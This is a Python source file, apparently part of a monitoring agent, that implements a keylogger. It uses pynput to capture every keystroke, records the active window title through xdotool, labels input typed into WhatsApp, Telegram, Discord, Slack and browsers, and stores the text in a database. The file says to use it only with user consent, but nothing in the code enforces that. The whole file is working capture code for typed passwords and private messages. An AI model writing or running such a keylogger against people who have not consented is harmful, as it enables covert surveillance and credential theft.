#!/usr/bin/env python3
# agent/keyboard_monitor.py
"""
Monitora texto digitado pelo usuário e armazena com contexto da aplicação ativa.
IMPORTANTE: Uso apenas com consentimento explícito do usuário.
"""
import time
import threading
import logging
from datetime import datetime
from collections import deque
from pynput import keyboard
from db import insert_event
import subprocess
import shlex

# Configurações
BUFFER_SIZE = 1000  # caracteres máximos no buffer
SAVE_INTERVAL = 30  # salvar a cada N segundos
MIN_TEXT_LENGTH = 5  # mínimo de caracteres para salvar

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class KeyboardMonitor:
    def __init__(self):
        self.current_text = []
        self.current_window = None
        self.last_save_time = time.time()
        self.running = False
        self.lock = threading.Lock()
        self.special_keys = []
        
    def get_active_window_info(self):
        """Obtém informações da janela ativa"""
        try:
            p = subprocess.run(
                shlex.split("xdotool getactivewindow getwindowname"),
                capture_output=True, text=True, timeout=1, check=False
            )
            if p.returncode == 0:
                return p.stdout.strip()
        except Exception as e:
            logging.debug(f"Error getting window: {e}")
        return "unknown"
    
    def should_save(self):
        """Verifica se deve salvar o texto atual"""
        now = time.time()
        text_length = len(self.current_text)
        
        # Salva se passou o intervalo E tem texto suficiente
        if (now - self.last_save_time >= SAVE_INTERVAL and 
            text_length >= MIN_TEXT_LENGTH):
            return True
        
        # Salva se o buffer está muito cheio
        if text_length >= BUFFER_SIZE:
            return True
            
        return False
    
    def save_text_event(self):
        """Salva o texto atual no banco de dados"""
        with self.lock:
            if len(self.current_text) < MIN_TEXT_LENGTH:
                return
            
            text = ''.join(self.current_text)
            window = self.current_window or "unknown"
            
            # Identifica se é WhatsApp, Telegram, etc
            app_type = "text_input"
            if "whatsapp" in window.lower():
                app_type = "whatsapp"
            elif "telegram" in window.lower():
                app_type = "telegram"
            elif "discord" in window.lower():
                app_type = "discord"
            elif "slack" in window.lower():
                app_type = "slack"
            elif any(browser in window.lower() for browser in ["firefox", "chrome", "chromium", "edge"]):
                app_type = "browser_input"
            
            try:
                # Salva no banco com tipo específico
                ts = int(time.time())
                insert_event(
                    ts=ts,
                    typ=app_type,
                    title=window,
                    detail=text[:500],  # Limita tamanho do detalhe
                    duration=int(time.time() - self.last_save_time)
                )
                
                logging.info(f"Saved {app_type} text: {len(text)} chars from '{window[:50]}'")
                
                # Limpa buffer
                self.current_text = []
                self.last_save_time = time.time()
                
            except Exception as e:
                logging.error(f"Error saving text event: {e}")
    
    def on_press(self, key):
        """Callback quando uma tecla é pressionada"""
        try:
            with self.lock:
                # Atualiza janela atual
                current_window = self.get_active_window_info()
                
                # Se mudou de janela, salva o texto anterior
                if current_window != self.current_window and len(self.current_text) >= MIN_TEXT_LENGTH:
                    self.save_text_event()
                
                self.current_window = current_window
                
                # Processa tecla
                if hasattr(key, 'char') and key.char is not None:
                    # Tecla de caractere normal
                    self.current_text.append(key.char)
                else:
                    # Teclas especiais
                    if key == keyboard.Key.space:
                        self.current_text.append(' ')
                    elif key == keyboard.Key.enter:
                        self.current_text.append('\n')
                    elif key == keyboard.Key.tab:
                        self.current_text.append('\t')
                    elif key == keyboard.Key.backspace:
                        if self.current_text:
                            self.current_text.pop()
                    # Ignora outras teclas especiais (Ctrl, Alt, etc)
                
                # Verifica se deve salvar
                if self.should_save():
                    self.save_text_event()
                    
        except Exception as e:
            logging.error(f"Error in on_press: {e}")
    
    def start(self):
        """Inicia o monitoramento"""
        self.running = True
        logging.info("Starting keyboard monitor...")
        
        # Thread para salvar periodicamente
        def periodic_save():
            while self.running:
                time.sleep(SAVE_INTERVAL)
                if len(self.current_text) >= MIN_TEXT_LENGTH:
                    self.save_text_event()
        
        save_thread = threading.Thread(target=periodic_save, daemon=True)
        save_thread.start()
        
        # Listener de teclado (blocking)
        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                logging.info("Keyboard monitor started successfully")
                listener.join()
        except Exception as e:
            logging.error(f"Error starting keyboard listener: {e}")
            raise
    
    def stop(self):
        """Para o monitoramento"""
        self.running = False
        # Salva texto pendente
        if len(self.current_text) >= MIN_TEXT_LENGTH:
            self.save_text_event()
        logging.info("Keyboard monitor stopped")


if __name__ == "__main__":
    import signal
    import sys
    
    monitor = KeyboardMonitor()
    
    def signal_handler(sig, frame):
        logging.info("Received signal, stopping...")
        monitor.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    print("🎹 Keyboard Monitor starting...")
    print("⚠️  This will capture all text typed. Use only with user consent!")
    print("Press Ctrl+C to stop")
    
    try:
        monitor.start()
    except KeyboardInterrupt:
        monitor.stop()
